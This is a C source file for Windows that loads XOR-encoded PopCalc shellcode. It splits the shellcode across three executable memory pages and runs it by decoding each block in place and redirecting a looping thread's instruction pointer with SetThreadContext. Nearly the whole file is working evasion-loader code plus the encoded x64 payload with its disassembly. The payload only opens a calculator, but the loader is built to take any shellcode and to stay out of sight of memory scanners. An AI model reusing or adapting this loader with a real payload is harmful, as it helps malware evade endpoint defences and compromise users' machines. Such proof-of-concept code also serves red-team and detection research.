/**
    @author     x0reaxeax
    @brief      Encoded PopCalc shellcode split and executed across multiple pages

    @credits    https://github.com/boku7 - for the PopCalc shellcode
                ChatGPT                  - for being BFF and formatting the shellcode

    https://github.com/x0reaxeax
*/

#include <Windows.h>
#include <stdio.h>

#define PAGESIZE    0x1000
#define XOR_BYTE    0x39
/**
* Original shellcode source: https://www.exploit-db.com/shellcodes/49819
*/
BYTE abShellcode[] = {

    /// [ PART 1 ]      - 86 (0x56) bytes + 2 bytes padding
    0x71, 0x08, 0xc6,                                               //    0x48, 0x31, 0xff,                                             #   xor    rdi,rdi
    0x71, 0xce, 0xde,                                               //    0x48, 0xf7, 0xe7,                                             #   mul    rdi
    0x5c, 0x71, 0xb2, 0x61, 0x59,                                   //    0x65, 0x48, 0x8b, 0x58, 0x60,                                 #   mov    rbx,QWORD PTR gs:[rax+0x60]
    0x71, 0xb2, 0x62, 0x21,                                         //    0x48, 0x8b, 0x5b, 0x18,                                       #   mov    rbx,QWORD PTR [rbx+0x18]
    0x71, 0xb2, 0x62, 0x19,                                         //    0x48, 0x8b, 0x5b, 0x20,                                       #   mov    rbx,QWORD PTR [rbx+0x20]
    0x71, 0xb2, 0x22,                                               //    0x48, 0x8b, 0x1b,                                             #   mov    rbx,QWORD PTR [rbx]
    0x71, 0xb2, 0x22,                                               //    0x48, 0x8b, 0x1b,                                             #   mov    rbx,QWORD PTR [rbx]
    0x71, 0xb2, 0x62, 0x19,                                         //    0x48, 0x8b, 0x5b, 0x20,                                       #   mov    rbx,QWORD PTR [rbx+0x20]
    0x70, 0xb0, 0xe1,                                               //    0x49, 0x89, 0xd8,                                             #   mov    r8,rbx
    0xb2, 0x62, 0x05,                                               //    0x8b, 0x5b, 0x3c,                                             #   mov    ebx,DWORD PTR [rbx+0x3c]
    0x75, 0x38, 0xfa,                                               //    0x4c, 0x01, 0xc3,                                             #   add    rbx,r8
    0x71, 0x08, 0xf0,                                               //    0x48, 0x31, 0xc9,                                             #   xor    rcx,rcx
    0x5f, 0xb8, 0xf8, 0xc6, 0xb1,                                   //    0x66, 0x81, 0xc1, 0xff, 0x88,                                 #   add    cx,0x88ff
    0x71, 0xf8, 0xd0, 0x31,                                         //    0x48, 0xc1, 0xe9, 0x08,                                       #   shr    rcx,0x8
    0xb2, 0x2d, 0x32,                                               //    0x8b, 0x14, 0x0b,                                             #   mov    edx,DWORD PTR [rbx+rcx*1]
    0x75, 0x38, 0xfb,                                               //    0x4c, 0x01, 0xc2,                                             #   add    rdx,r8
    0x74, 0x08, 0xeb,                                               //    0x4d, 0x31, 0xd2,                                             #   xor    r10,r10
    0x7d, 0xb2, 0x6b, 0x25,                                         //    0x44, 0x8b, 0x52, 0x1c,                                       #   mov    r10d,DWORD PTR [rdx+0x1c]
    0x74, 0x38, 0xfb,                                               //    0x4d, 0x01, 0xc2,                                             #   add    r10,r8
    0x74, 0x08, 0xe2,                                               //    0x4d, 0x31, 0xdb,                                             #   xor    r11,r11
    0x7d, 0xb2, 0x63, 0x19,                                         //    0x44, 0x8b, 0x5a, 0x20,                                       #   mov    r11d,DWORD PTR [rdx+0x20]
    0x74, 0x38, 0xfa,                                               //    0x4d, 0x01, 0xc3,                                             #   add    r11,r8
    0x74, 0x08, 0xdd,                                               //    0x4d, 0x31, 0xe4,                                             #   xor    r12,r12
    0x7d, 0xb2, 0x5b, 0x1d,                                         //    0x44, 0x8b, 0x62, 0x24,                                       #   mov    r12d,DWORD PTR [rdx+0x24]
    0x74, 0x38, 0xfd,                                               //    0x4d, 0x01, 0xc4,                                             #   add    r12,r8

    // * --- BLOCK      - 86 bytes
    0xd2, 0xc7,                                                     //    0xeb, 0xfe,                                                   #   jmp    $
    // * --- JMP LOOP   - 2 bytes

    /// [ PART 2 ]      - 86 (0x56) bytes + 2 bytes padding
    0xd2, 0x0b,                                                     // 0xeb, 0x32,                                                      #   jmp    0x8a
    0x62,                                                           // 0x5b,                                                            #   pop    rbx
    0x60,                                                           // 0x59,                                                            #   pop    rcx
    0x71, 0x08, 0xf9,                                               // 0x48, 0x31, 0xc0,                                                #   xor    rax,rax
    0x71, 0xb0, 0xdb,                                               // 0x48, 0x89, 0xe2,                                                #   mov    rdx,rsp
    0x68,                                                           // 0x51,                                                            #   push   rcx
    0x71, 0xb2, 0x35, 0x1d,                                         // 0x48, 0x8b, 0x0c, 0x24,                                          #   mov    rcx,QWORD PTR [rsp]
    0x71, 0x08, 0xc6,                                               // 0x48, 0x31, 0xff,                                                #   xor    rdi,rdi
    0x78, 0xb2, 0x05, 0xba,                                         // 0x41, 0x8b, 0x3c, 0x83,                                          #   mov    edi,DWORD PTR [r11+rax*4]
    0x75, 0x38, 0xfe,                                               // 0x4c, 0x01, 0xc7,                                                #   add    rdi,r8
    0x71, 0xb0, 0xef,                                               // 0x48, 0x89, 0xd6,                                                #   mov    rsi,rdx
    0xca, 0x9f,                                                     // 0xf3, 0xa6,                                                      #   repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
    0x4d, 0x3c,                                                     // 0x74, 0x05,                                                      #   je     0x7b
    0x71, 0xc6, 0xf9,                                               // 0x48, 0xff, 0xc0,                                                #   inc    rax
    0xd2, 0xdf,                                                     // 0xeb, 0xe6,                                                      #   jmp    0x61
    0x60,                                                           // 0x59,                                                            #   pop    rcx
    0x5f, 0x78, 0xb2, 0x3d, 0x7d,                                   // 0x66, 0x41, 0x8b, 0x04, 0x44,                                    #   mov    ax,WORD PTR [r12+rax*2]
    0x78, 0xb2, 0x3d, 0xbb,                                         // 0x41, 0x8b, 0x04, 0x82,                                          #   mov    eax,DWORD PTR [r10+rax*4]
    0x75, 0x38, 0xf9,                                               // 0x4c, 0x01, 0xc0,                                                #   add    rax,r8
    0x6a,                                                           // 0x53,                                                            #   push   rbx
    0xfa,                                                           // 0xc3,                                                            #   ret
    0x71, 0x08, 0xf0,                                               // 0x48, 0x31, 0xc9,                                                #   xor    rcx,rcx
    0xb9, 0xf8, 0x3e,                                               // 0x80, 0xc1, 0x07,                                                #   add    cl,0x7
    0x71, 0x81, 0x36, 0x91, 0xaf, 0xa8, 0x83, 0xbe, 0xa3, 0xa5,     // 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c,      #   movabs rax,0x9c9a87ba9196a80f
    0x71, 0xce, 0xe9,                                               // 0x48, 0xf7, 0xd0,                                                #   not    rax
    0x71, 0xf8, 0xd1, 0x31,                                         // 0x48, 0xc1, 0xe8, 0x08,                                          #   shr    rax,0x8
    0x69,                                                           // 0x50,                                                            #   push   rax
    0x68,                                                           // 0x51,                                                            #   push   rcx
    0xd1, 0x89, 0xc6, 0xc6, 0xc6,                                   // 0xe8, 0xb0, 0xff, 0xff, 0xff,                                    #   call   0x58
    0x70, 0xb0, 0xff,                                               // 0x49, 0x89, 0xc6,                                                #   mov    r14,rax
    0xa9,                                                           // 0x90,                                                            #   nop

    // * --- BLOCK      - 86 bytes
    0xd2, 0xc7,                                                     // 0xeb, 0xfe,                                                      #   jmp    $
    // * --- JMP LOOP   - 2 bytes


    /// [ PART 2 ]      - 86 (0x56) bytes + 2 bytes padding
    0x71, 0x08, 0xf0,                                               // 0x48, 0x31, 0xc9,                                               #   xor    rcx,rcx
    0x71, 0xce, 0xd8,                                               // 0x48, 0xf7, 0xe1,                                               #   mul    rcx
    0x69,                                                           // 0x50,                                                           #   push   rax
    0x71, 0x81, 0xa5, 0xa7, 0xaa, 0xa5, 0xe8, 0xa3, 0xbe, 0xa3,     // 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a,     #   movabs rax,0x9a879ad19c939e9c
    0x71, 0xce, 0xe9,                                               // 0x48, 0xf7, 0xd0,                                               #   not    rax
    0x69,                                                           // 0x50,                                                           #   push   rax
    0x71, 0xb0, 0xd8,                                               // 0x48, 0x89, 0xe1,                                               #   mov    rcx,rsp
    0x71, 0xc6, 0xfb,                                               // 0x48, 0xff, 0xc2,                                               #   inc    rdx
    0x71, 0xba, 0xd5, 0x19,                                         // 0x48, 0x83, 0xec, 0x20,                                         #   sub    rsp,0x20
    0x78, 0xc6, 0xef,                                               // 0x41, 0xff, 0xd6,                                               #   call   r14

    0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,                       // 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,                       // 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,                       // 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,                       // 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,                       // 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,                       // 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9, 0xa9,                       // 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0xa9, 0xa9, 0xa9,                                               // 0x90, 0x90, 0x90,                                               #   nop
    // -- NOP PAD       - 52 bytes

    // --- BLOCK        - 86 bytes
    0xd2, 0xc7                                                      // 0xeb, 0xfe                                                      #   jmp $
    // --- JMP LOOP     - 2 bytes
};

VOID Loop(VOID) {
_LOOP:
    goto _LOOP;
}

INT RunShellcode(VOID) {

    CONST DWORD dwRuntimeMs = 3000;

    CONST DWORD nParts = 3;
    CONST DWORD cbPartSize = 86;
    CONST DWORD cbPadding = 2;
    CONST DWORD cbBlockSize = cbPartSize + cbPadding;

    LPVOID* alpParts = VirtualAlloc(
        NULL,
        nParts * sizeof(LPVOID),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (NULL == alpParts) {
        fprintf(
            stderr,
            "[-] VirtualAlloc() - E%lu\n",
            GetLastError()
        );

        return EXIT_FAILURE;
    }

    SIZE_T cbAllocated = 0;
    for (DWORD i = 0; i < nParts; i++) {
        alpParts[i] = VirtualAlloc(
            NULL,
            PAGESIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (NULL == alpParts[i]) {
            fprintf(
                stderr,
                "[-] VirtualAlloc() - E%lu [part %lu]\n",
                GetLastError(),
                i
            );
            return EXIT_FAILURE;
        }

        cbAllocated += PAGESIZE;

        memcpy(
            (LPVOID)((ULONG_PTR)(alpParts[i]) + (PAGESIZE - cbBlockSize)),
            &abShellcode[i * cbBlockSize],
            cbBlockSize
        );

        printf("[+] Part %lu @ 0x%p\n", i + 1, alpParts[i]);
    }

    printf("[+] Allocated 0x%llx bytes\n", cbAllocated);

    puts("[*] Press ENTER to execute shellcode");
    { char c = getchar(); }

    DWORD dwThreadId = 0;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        // (LPTHREAD_START_ROUTINE) ((ULONG_PTR) alpParts[0] + (PAGESIZE - cbBlockSize)),
        (LPTHREAD_START_ROUTINE)Loop,
        NULL,
        0,
        &dwThreadId
    );

    if (NULL == hThread) {
        fprintf(
            stderr,
            "[-] CreateThread() - E%lu\n",
            GetLastError()
        );
        return EXIT_FAILURE;
    }

    printf("[+] Thread created - TID %lu\n", dwThreadId);

    for (DWORD i = 0; i < nParts; i++) {

        printf("[ ------- PART %lu/%lu ------- ]\n", i + 1, nParts);

        printf("| [*] Suspending thread %lu\n", dwThreadId);
        if (-1 == SuspendThread(hThread)) {
            fprintf(
                stderr,
                "| [-] SuspendThread() - E%lu\n",
                GetLastError()
            );
            return EXIT_FAILURE;
        }


        CONTEXT ctx = {
            .ContextFlags = CONTEXT_CONTROL
        };

        if (!GetThreadContext(hThread, &ctx)) {
            fprintf(
                stderr,
                "| [-] GetThreadContext() - E%lu\n",
                GetLastError()
            );
            return EXIT_FAILURE;
        }

        printf("| [+] RIP: 0x%llx\n", ctx.Rip);

        ctx.Rip = (ULONG_PTR)alpParts[i] + (PAGESIZE - cbBlockSize);
        printf("| [*] Setting RIP to 0x%llx (%lu/%lu)\n", ctx.Rip, i + 1, nParts);

        printf("| [*] Decoding block..\n");

        for (DWORD j = 0; j < cbBlockSize; j++) {
            *(PBYTE)(ctx.Rip + j) ^= XOR_BYTE;
        }

        printf("| [*] Verifying block..\n");

        if (0xfeeb != *(PWORD)(ctx.Rip + cbPartSize)) {
            fprintf(
                stderr,
                "| [-] Block verification failed:\n"
                "|  * RIP @ 0x%llx\n"
                "|  * LOOP: 0x%04lx\n",
                ctx.Rip,
                *(PWORD)(ctx.Rip + cbPartSize)
            );

            printf("| [ --- DEBUG PAUSE ---]\n");
            { char c = getchar(); }

            return EXIT_FAILURE;
        }

        if (!SetThreadContext(hThread, &ctx)) {
            fprintf(
                stderr,
                "| [-] SetThreadContext() - E%lu\n",
                GetLastError()
            );
            return EXIT_FAILURE;
        }

        if (0 != i) {
            printf(
                "| [*] Freeing part %lu/%lu @ 0x%02llx..\n",
                i,
                nParts,
                (ULONG_PTR)alpParts[i - 1]
            );

            if (!VirtualFree(alpParts[i - 1], 0, MEM_RELEASE)) {
                fprintf(
                    stderr,
                    "| [-] VirtualFree() - E%lu [part %lu]\n",
                    GetLastError(),
                    i
                );
                return EXIT_FAILURE;
            }
        }

        printf("| [*] Resuming thread\n");

        if (-1 == ResumeThread(hThread)) {
            fprintf(
                stderr,
                "| [-] ResumeThread() - E%lu\n",
                GetLastError()
            );
            return EXIT_FAILURE;
        }

        printf("| [*] Waiting %lu ms\n", dwRuntimeMs);
        Sleep(dwRuntimeMs);
    }

    printf(
        "| [*] Freeing part %lu/%lu @ 0x%02llx..\n",
        nParts,
        nParts,
        (ULONG_PTR)alpParts[nParts - 1]
    );

    if (!VirtualFree(alpParts[nParts - 1], 0, MEM_RELEASE)) {
        fprintf(
            stderr,
            "| [-] VirtualFree() - E%lu [part %lu]\n",
            GetLastError(),
            nParts - 1
        );
        return EXIT_FAILURE;
    }

    CloseHandle(hThread);

    if (!VirtualFree(alpParts, 0, MEM_RELEASE)) {
        fprintf(
            stderr,
            "[-] VirtualFree() - E%lu\n",
            GetLastError()
        );
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

int main(void) {
    if (EXIT_SUCCESS == RunShellcode()) {
        printf("[+] Execution complete\n");
    }

    return EXIT_SUCCESS;
}